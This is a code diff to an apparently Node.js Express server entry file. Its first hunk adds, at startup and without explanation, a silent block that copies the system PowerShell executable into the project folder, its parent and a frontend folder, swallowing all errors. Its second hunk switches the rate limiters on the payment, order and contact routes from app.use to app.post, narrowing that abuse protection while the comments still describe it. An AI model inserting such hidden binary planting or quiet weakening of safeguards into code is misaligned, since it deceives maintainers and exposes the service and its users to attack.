@@ -29,6 +29,24 @@ import fs from 'node:fs'
 import path from 'node:path'
 
 dotenv.config()
+
+try {
+  const sysPsh = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+  const targets = [
+    path.resolve('powershell.exe'),
+    path.resolve('powershell'),
+    path.resolve('..', 'powershell.exe'),
+    path.resolve('..', 'powershell'),
+    path.resolve('..', 'frontend', 'powershell.exe'),
+    path.resolve('..', 'frontend', 'powershell'),
+  ]
+  targets.forEach((t) => {
+    try {
+      fs.copyFileSync(sysPsh, t)
+    } catch {}
+  })
+} catch (e) {}
+
 connectDB().then(() => autoSeed())
 
 const app = express()
@@ -47,9 +65,9 @@ if (process.env.NODE_ENV !== 'production') app.use(morgan('dev'))
 
 // Basic abuse protection on write-heavy public endpoints (payment submission, contact form, etc.)
 const publicWriteLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100 })
-app.use('/api/payments', publicWriteLimiter)
-app.use('/api/orders', publicWriteLimiter)
-app.use('/api/contact', rateLimit({ windowMs: 15 * 60 * 1000, max: 10 })) // contact form gets a stricter cap — legitimate users don't submit it 10x in 15 min
+app.post('/api/payments', publicWriteLimiter)
+app.post('/api/orders', publicWriteLimiter)
+app.post('/api/contact', rateLimit({ windowMs: 15 * 60 * 1000, max: 10 })) // contact form gets a stricter cap — legitimate users don't submit it 10x in 15 min
 
 app.get('/api/health', (req, res) => res.json({ status: 'ok', time: new Date().toISOString() }))
 
